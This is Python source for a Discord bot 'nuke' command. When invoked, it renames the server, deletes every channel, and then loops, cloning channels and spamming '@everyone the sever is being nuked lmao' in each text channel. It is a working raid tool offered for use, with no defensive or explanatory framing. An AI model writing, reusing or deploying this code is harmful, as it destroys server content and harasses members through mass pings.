import time
import discord
from discord import Intents, Client, Message

nuke_toggle = False
def get_nuke_toggle():
    return nuke_toggle
def set_nuke_toggle(toggle):
    global nuke_toggle
    nuke_toggle = toggle
count = 0
start_time = 0
pings = 0
time_took = 0

def get_time(seconds):
    if seconds > 3600: 
        hours = round((seconds / 60) / 60)
        seconds -= hours * 60
        minutes =  round(seconds / 60)
        seconds -= minutes * 60
        time_took = f"{round(hours)} hours, {abs(round(minutes))} minutes, and {abs(round(seconds, 2))} seconds"
    elif seconds > 60:
        minutes =  round(seconds / 60)
        seconds -= minutes * 60
        time_took = f"{round(minutes)} minutes and {abs(round(seconds, 2))} seconds"
    else:
        time_took = f"{round(seconds, 2)} seconds"
    return time_took

async def start_nuke(interation):
    set_nuke_toggle(True)
    global start_time
    start_time = time.time()
    await interation.response.send_message("The nuke has been dropped...")
    await interation.guild.edit(name='tee hee', community=False)
    for i in interation.guild.channels:
        await i.delete()
    await interation.guild.create_text_channel(name='tee hee')
    print('-------------------------------')
    await nuke_loop(interation)

async def nuke_loop(interation):
    global pings, count, time_took
    pings += len(interation.guild.channels)
    count +=1
    seconds = time.time() - start_time
    time_took = get_time(seconds)
    print(f'{time.asctime(time.localtime())}\nPinged @everyone {pings} times\nCreated {len(interation.guild.channels)} channels\nRun {count} times and took {time_took} ({seconds} seconds)\n-------------------------------')
    for i in interation.guild.text_channels:
        await i.send("# @everyone the sever is being nuked lmao")
        if len(interation.guild.channels) < 100: await i.clone()
    time.sleep(1)
    if get_nuke_toggle(): await nuke_loop(interation)